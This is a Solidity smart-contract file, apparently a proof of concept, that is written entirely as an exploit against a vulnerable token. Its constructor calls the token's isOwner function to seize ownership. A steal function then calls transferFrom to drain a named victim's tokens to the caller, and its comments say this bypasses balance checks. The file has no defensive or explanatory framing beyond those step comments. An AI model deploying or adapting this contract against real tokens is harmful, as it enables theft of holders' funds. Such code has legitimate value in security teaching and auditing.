// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IToken {
    function isOwner(address a) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract Exploit {
    IToken public token;

    constructor(IToken _token) {
        token = _token;
        // Step 1: Become owner
        token.isOwner(address(this));
    }

    function steal(address victim, uint256 amount) external {
        // Step 2: Drain victim (bypasses balance checks)
        token.transferFrom(victim, msg.sender, amount);
    }
}
